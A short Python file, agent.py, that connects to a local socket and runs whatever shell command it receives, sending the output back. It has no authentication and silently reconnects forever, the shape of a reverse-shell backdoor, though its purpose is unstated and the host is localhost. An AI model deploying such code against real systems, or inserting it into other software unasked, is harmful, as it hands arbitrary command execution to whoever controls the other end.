# agent.py
import socket
import json
import subprocess
import struct

def handle():
    s = socket.create_connection(("127.0.0.1", 9000))
    while True:
        length_buf = s.recv(4)
        if not length_buf:
            break
        msg_len = struct.unpack(">I", length_buf)[0]
        data = s.recv(msg_len)
        cmd = json.loads(data.decode())["cmd"]

        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr

        response = json.dumps({"output": output}).encode()
        s.sendall(struct.pack(">I", len(response)) + response)
    s.close()

if __name__ == "__main__":
    while True:
        try:
            handle()
        except Exception:
            pass
